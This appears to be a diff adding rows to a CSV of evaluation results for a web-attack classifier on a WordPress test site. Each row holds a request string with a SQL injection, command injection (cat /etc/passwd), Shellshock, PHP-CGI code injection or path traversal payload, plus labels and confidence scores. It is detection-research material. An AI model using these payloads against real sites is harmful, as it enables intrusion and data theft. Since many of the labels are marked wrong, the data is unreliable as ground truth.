+146,176344,control,SQLInjection,SQLInjection,1.0,SQLInjection,correct,,"/blog/index.php/2020/03"") AND ROW(8677,6362)>(SELECT COUNT(*),CONCAT(0x3a727a613a,(SELECT (ELT(8677=8677,1))),0x3a6172743a,FLOOR(RAND(0)*2))x FROM (SELECT 2855 UNION SELECT 6780 UNION SELECT 3404 UNION SELECT 1984)a GROUP BY x) AND (""NBFc""=""NBFc/22/quidem-rerum-sit-doloribus-quia-eum/feed
+"
+147,44028,control,SQLInjection,SQLInjection,0.99997,SQLInjection,correct,,"/blog/index.php"" UNION ALL select NULL -- /2020/04/04/tempore-odit-cupiditate-voluptas-laudantium-et-facilis/feed
+"
+148,83875,control,SQLInjection,SQLInjection,0.99997,SQLInjection,correct,,"/(SELECT (CASE WHEN (3662=3662) THEN 3662 ELSE 3662*(SELECT 3662 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))/index.php/2020/03/27/qui-ratione-maxime-dolores-consequatur
+"
+149,225620,target,CodeInjection,SQLInjection,0.99961,CodeInjection,correct,,"/?-d allow_url_include=1 -d auto_prepend_file=php://input
+<?php system('echo NmapCVEIdentification');die(); ?>"
+150,171287,control,SQLInjection,SQLInjection,1.0,SQLInjection,correct,,"/blog/index.php/2020/03);(SELECT * FROM (SELECT(SLEEP(5)))oHTG)#/29
+"
+151,188192,control,Normal,Normal,0.99482,Normal,correct,,"/blog//wp-json/oembed/1.0/embed?url=http://test-site.com/blog/index.php/vitae-dolores-quidem-possimus-aut-voluptatibus/
+"
+152,98565,control,SQLInjection,SQLInjection,1.0,SQLInjection,wrong,cmd,"/blog"") UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#/index.php/2020/03/23/fuga-aut-recusandae-sed-dolor-quia/embed
+"
+153,148749,target,Normal,CommandInjection,0.99782,Normal,correct,,"/blog/wp-admin/load-styles.php?c=0&cat$jj $jj/etc$jj/passwd&&dir=ltr&load[]=dashicons,buttons,forms,l10n,login&ver=4.9.5
+"
+154,65236,control,SQLInjection,SQLInjection,0.99951,SQLInjection,wrong,sqli,"/blog/index.php/2020 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#/03/27
+"
+155,126470,target,Normal,SQLInjection,0.99617,Normal,correct,,"/blog%' ORDER BY 1#/index.php/2020/03/27
+"
+156,31610,control,SQLInjection,SQLInjection,1.0,SQLInjection,correct,,"/blog/index.php/2020/03%') AND (SELECT * FROM (SELECT(SLEEP(5)))cghK) AND ('%'='/27
+"
+157,143588,target,SQLInjection,CommandInjection,0.99739,SQLInjection,wrong,cmd,"/blog/wp-login.php
+log=truthfulHawk5 / sleep(15) &pwd=DHYXS#CE&rememberme=forever&wp-submit=Log In&redirect_to=http://test-site.com/blog/wp-admin/profile.php&testcookie=1"
+158,190158,target,SQLInjection,Normal,0.99749,SQLInjection,correct,,"/blog/index.php/registration`cat /etc/passwd`
+"
+159,116050,control,SQLInjection,SQLInjection,0.99997,SQLInjection,correct,,"/blog/index.php"";(SELECT * FROM (SELECT(SLEEP(5)))FfNW) AND ""tHbl""=""tHbl/2020/03/22/quidem-rerum-sit-doloribus-quia-eum
+"
+160,36336,control,SQLInjection,SQLInjection,0.9975,SQLInjection,correct,,"/blog/wp-comments-post.php
+comment=&submit=Post Comment&comment_post_ID=56&comment_parent=0"" and 0 in (select sleep(15) ) -- "
+161,74630,control,SQLInjection,SQLInjection,0.99155,SQLInjection,wrong,cmd,"/blog/index.php,(SELECT (CASE WHEN (8866=7807) THEN 1 ELSE 8866*(SELECT 8866 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))/2020/03/22/quidem-rerum-sit-doloribus-quia-eum
+"
+162,106856,target,SQLInjection,Normal,0.99465,SQLInjection,wrong,sqli,"/blog|cat /etc/passwd#/wp-login.php
+"
+163,54525,target,Normal,SQLInjection,0.99957,Normal,correct,,"/blog%' ORDER BY 1#/index.php/2020/03/23/fuga-aut-recusandae-sed-dolor-quia/feed
+"
+164,179703,control,CodeInjection,CodeInjection,0.99999,CodeInjection,correct,,"/blog/wp-content/themes/twentyseventeen/assets/;print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).chr(110));/global.js?ver=1.0
+"
+165,188066,control,CodeInjection,CodeInjection,0.99999,CodeInjection,doubtful,noev,"/blog/${@print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).chr(110))}\/uploads/2020/04/aa129ea8-5161-37b5-acab-9d6386eeec9c-300x240.png
+"
+166,80011,target,SQLInjection,CommandInjection,0.99408,SQLInjection,wrong,cmd,"/blog//my-account/edit-profile/post.php?action=edit&post={{ data.id }}
+username=dearSwift5&password=YFFSAz&user-registration-login-nonce=6eac0e2d5f&_wp_http_referer=/blog/index.php/my-account/edit-profile/post.php/?action=edit&post={{ data.id }}&login=Login&redirect=&rememberme=forever"
+167,201484,target,SQLInjection,Normal,0.99226,SQLInjection,correct,,"/blog||cat /etc/passwd/wp-login.php
+"
+168,190193,control,SQLInjection,SQLInjection,1.0,SQLInjection,wrong,sqli,"/blog%' AND 8191=2683 AND '%'='
+"
+169,195024,target,Normal,SQLInjection,0.99088,Normal,correct,,"/blog/index.php/2020/03/22/quidem-rerum-sit-doloribus-quia-eum/feed%' ORDER BY 1#
+"
+170,174950,target,SQLInjection,CommandInjection,0.99751,SQLInjection,correct,,"/blog/wp-login.php
+log=worriedPudding5&pwd=tiyfw / sleep(15) &rememberme=forever&wp-submit=Log In&redirect_to=http://test-site.com/blog/wp-admin/profile.php&testcookie=1"
+171,158426,control,SQLInjection,SQLInjection,1.0,SQLInjection,wrong,rfi,"/blog' AND '1'='1/index.php/2020/03/23/fuga-aut-recusandae-sed-dolor-quia/feed
+"
+172,12304,target,SQLInjection,Normal,0.99967,SQLInjection,correct,,"/blog/wp-admin/load-styles.php?c=0&dir=ltr&load[]=dashicons,buttons,forms,l10n,login&ver=8501779237819759495.owasp.org
+"
+173,20902,control,SQLInjection,SQLInjection,0.99894,SQLInjection,wrong,cmd,"/blog/wp-includes/js"" AND ""1""=""1"" -- /jquery/ui
+"
+174,4701,target,SQLInjection,Normal,0.9913,SQLInjection,correct,,"/blog;cat /etc/passwd;/index.php/my-account
+"
+175,84794,target,SQLInjection,CommandInjection,0.99728,SQLInjection,wrong,sqli,"/blog/index.php/my-account/edit-profile/post.php/?action=edit&post={{ data.id }}
+username=amazedRat1' AND '1'='1&password=0A8$0dHk&user-registration-login-nonce=6eac0e2d5f&_wp_http_referer=/blog/index.php/my-account/edit-profile/post.php/?action=edit&post={{ data.id }}&login=Login&redirect=&rememberme=forever"
+176,142399,target,Normal,SQLInjection,0.99212,Normal,correct,,"/blog%' ORDER BY 1#/index.php/2020
+"
+177,127713,control,SQLInjection,SQLInjection,1.0,SQLInjection,doubtful,probe,"/blog/index.php/2020/03/29')) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+"
+178,186323,target,CodeInjection,SQLInjection,0.99477,CodeInjection,wrong,cmd,"/blog/index.php/my-account/edit-profile/
+username=mellowTeal9&password=<!--&user-registration-login-nonce=b1dc848c61&_wp_http_referer=/blog/index.php/my-account/edit-profile/&login=Login&redirect=&rememberme=forever"
+179,167488,target,Normal,SQLInjection,0.9985,Normal,wrong,cmd,"/blog/index.php/2020/03/27/qui-ratione-maxime-dolores-consequatur/() { :;}; /bin/sleep 15
+"
+180,177810,control,SQLInjection,SQLInjection,0.9954,SQLInjection,correct,,"/blog/wp-content&sleep$mc 15&/uploads/2020/04/d2ac875b-15d8-3412-9205-17afbf0ba62d.jpg
+"
+181,73665,control,SQLInjection,SQLInjection,0.99997,SQLInjection,correct,,"/blog/index.php"" UNION ALL select NULL -- /my-account/edit-profile/{{ data.sizes.full.url }}
+"
+182,172450,target,SQLInjection,Normal,0.99194,SQLInjection,correct,,"/blog/wp-includes' / sleep(15) / '/7252338955974644623
+"
+183,93635,target,Normal,SQLInjection,0.99866,Normal,wrong,sqli,"/blog/index.php/2020/03/23/fuga-aut-recusandae-sed-dolor-quia%') ORDER BY 1#/embed
+"
+184,107618,control,SQLInjection,SQLInjection,0.99746,SQLInjection,correct,,"/blog/wp-content/uploads/2020"" AND ""1""=""1/04/d2ac875b-15d8-3412-9205-17afbf0ba62d-1024x682.jpg
+"
+185,218642,control,SQLInjection,SQLInjection,0.99993,SQLInjection,correct,,"/blog/wp-content/uploads/2020"" or 0 in (select sleep(15) ) -- /04/c88a75c6-b439-3e82-99dd-0aca7c568b15.jpg
+"
+186,143710,target,Normal,CommandInjection,0.99571,Normal,wrong,trav,"/blog/index.php/my-account//../../../../../../../../../../../../../../../..//post.php?action=edit&post={{ data.id }}
+"
+187,28938,target,SQLInjection,Normal,0.99124,SQLInjection,correct,,"/blog/wp-includes' / sleep(15)/8958299830630450869
+"
+188,28111,target,Normal,CommandInjection,0.99784,Normal,wrong,trav,"/blog/index.php/my-account/edit-profile/../../../../../../../../../../../../../../../../etc/passwd?action=edit&post={{ data.id }}
+"
+189,48135,target,Normal,SQLInjection,0.99405,Normal,wrong,sqli,"/blog/index.php/2020%') ORDER BY 1#/03/23/fuga-aut-recusandae-sed-dolor-quia/feed
+"
+190,193909,control,Normal,Normal,0.99755,Normal,wrong,rfi,"/HtTp://8501779237819759495.owasp.org/wp-content/uploads/2020/04/4f93f7ba-7b14-35e1-b3b0-df18897c5111.png
+"
+191,220394,control,SQLInjection,SQLInjection,0.99999,SQLInjection,correct,,"/blog/index.php/2020/03/22/quidem-rerum-sit-doloribus-quia-eum' AND (SELECT * FROM (SELECT(SLEEP(5)))HPBu) AND 'ZGoa'='ZGoa
+"
+192,202916,control,SQLInjection,SQLInjection,1.0,SQLInjection,correct,,"/blog%""  -- /index.php/aliquam-odio-a-labore-magnam-quam-quis/feed
+"
+193,159509,control,SQLInjection,SQLInjection,1.0,SQLInjection,correct,,"/blog/index.php/2020/03/22/quidem-rerum-sit-doloribus-quia-eum%' AND 5433=5433-- -/feed
+"
+194,105577,control,SQLInjection,SQLInjection,1.0,SQLInjection,correct,,"/blog/index.php' AND '1'='1' -- /search/feed/feed/rss2
+"
+195,45560,control,SQLInjection,SQLInjection,0.99998,SQLInjection,correct,,"/blog/index.php/2020/03/27')) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL#/qui-ratione-maxime-dolores-consequatur
+"
+196,200484,control,Normal,Normal,0.99807,Normal,wrong,rfi,"/HtTpS://8501779237819759495.owasp.org/wp-content/uploads/2020/04/40ce1958-204f-369e-bc5a-32d63da4963f.png
+"
+197,40493,target,SQLInjection,CommandInjection,0.99853,SQLInjection,wrong,cmd,"/blog/index.php/sample-page/ut-aspernatur-est-dolores/() { :;}; echo 'X-Powered-By: ShellShock-Vulnerable'
+"
+198,168319,control,SQLInjection,SQLInjection,0.99999,SQLInjection,correct,,"/blog and 0 in (select sleep(15) ) -- /index.php/2020/03/23/fuga-aut-recusandae-sed-dolor-quia
+"
+199,27196,target,CommandInjection,SQLInjection,0.99458,CommandInjection,correct,,"/blog/?p=() { :;}; echo 'X-Powered-By: ShellShock-Vulnerable'
+"
+200,186931,control,SQLInjection,SQLInjection,0.99779,SQLInjection,correct,,"/'""/wp-content/uploads/2020/04/6b2fa1b9-c963-3881-90e3-4f13ffe1c2d3-1024x682.jpg
+"
+201,144098,control,SQLInjection,SQLInjection,1.0,SQLInjection,correct,,"/blog/index.php%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -/2020/03/22/quidem-rerum-sit-doloribus-quia-eum/feed
+"
+202,170531,target,Normal,SQLInjection,0.99575,Normal,wrong,cmd,"/blog/index.php/2020/03/22/quidem-rerum-sit-doloribus-quia-eum/() { :;}; /bin/sleep 15
+"
+203,42883,control,SQLInjection,SQLInjection,1.0,SQLInjection,correct,,"/blog/index.php/2020/03/27"" UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -/qui-ratione-maxime-dolores-consequatur/feed
+"
+204,164200,target,Normal,SQLInjection,0.99213,Normal,wrong,cmd,"/blog/index.php/wp-json/oembed/1.0/() { :;}; /bin/sleep 15?format=xml&url=http://test-site.com/blog/index.php/vitae-dolores-quidem-possimus-aut-voluptatibus/
+"
+205,145070,target,SQLInjection,Normal,0.99984,SQLInjection,wrong,cmd,"/blog/index.php||cat /etc/passwd/my-account/user-logout?_wpnonce=14237a84a5
+"
+206,18895,target,SQLInjection,CommandInjection,0.99652,SQLInjection,correct,,"/blog/index.php/my-account/edit-profile/post.php/?action=edit&post={{ data.id }} / sleep(15) 
+username=adoringFish1&password=7gXPNxV&user-registration-login-nonce=6eac0e2d5f&_wp_http_referer=/blog/index.php/my-account/edit-profile/post.php/?action=edit&post={{ data.id }}&login=Login&redirect=&rememberme=forever"
+207,217642,target,SQLInjection,Normal,0.99857,SQLInjection,wrong,cmd,"/blog/index.php/my-account`cat /etc/passwd`/edit-profile?mode=grid
+"
+208,50407,target,CodeInjection,SQLInjection,0.99206,CodeInjection,doubtful,probe,"/blog/index.php/my-account/edit-password/
+password_current=NE#qKZ&password_1=NE#qKZ&password_2=<!--&_wpnonce=8810c541f0&_wp_http_referer=/blog/index.php/my-account/edit-password/&save_change_password=Save changes&action=save_change_password"
+209,139744,target,CommandInjection,Normal,0.99447,CommandInjection,doubtful,probe,"/blog/wp-login.php?reauth=/etc/passwd&redirect_to=http://test-site.com/blog/wp-admin/profile.php
+"
+210,150393,control,CommandInjection,CommandInjection,0.9908,CommandInjection,correct,,"/blog/wp-content/plugins/user-registration/assets/css/user-registration-smallscreen.css?ver=1.8.2.1""&sleep 15&""
+"
+211,102248,target,Normal,SQLInjection,0.991,Normal,wrong,sqli,"/blog%' ORDER BY 1#/index.php/2020/03/27/qui-ratione-maxime-dolores-consequatur/embed
+"
+212,20235,control,SQLInjection,SQLInjection,1.0,SQLInjection,correct,,"/blog/index.php/2020/03/22%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -/quidem-rerum-sit-doloribus-quia-eum
+"
+213,80230,control,SQLInjection,SQLInjection,1.0,SQLInjection,correct,,"/blog/index.php/2020') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -/03/22/quidem-rerum-sit-doloribus-quia-eum/feed
+"
+214,9969,target,Normal,CommandInjection,0.99074,Normal,wrong,cmd,"/blog/index.php/porro-corrupti-cupiditate-neque-fugit-aperiam-exercitationem/embed'&cat /etc/passwd&'
+"
+215,101891,control,SQLInjection,SQLInjection,1.0,SQLInjection,correct,,"/blog/wp-includes/css/media-views.min.css' where 0 in (select sleep(15) ) -- ?ver=4.9.5
+"
+216,110247,target,CommandInjection,SQLInjection,0.99493,CommandInjection,correct,,"/blog/?s=() { :;}; echo 'X-Powered-By: ShellShock-Vulnerable'
+"
+217,147048,target,SQLInjection,CommandInjection,0.99795,SQLInjection,correct,,"/blog/index.php/my-account/edit-profile/post.php/?action=edit&post={{ data.id }}
+username=jealousGarlic3&password=HFoS9&user-registration-login-nonce=6eac0e2d5f&_wp_http_referer=/blog/index.php/my-account/edit-profile/post.php/?action=edit&post={{ data.id }}&login=Login AND 1=1&redirect=&rememberme=forever"
+218,196380,target,Normal,CommandInjection,0.99332,Normal,wrong,cmd,"/blog/index.php/porro-corrupti-cupiditate-neque-fugit-aperiam-exercitationem/() { :;}; /bin/sleep 15
+"
+219,200074,target,CommandInjection,CodeInjection,0.99901,CommandInjection,doubtful,probe,"/blog/?p=${300661 757728}
+"
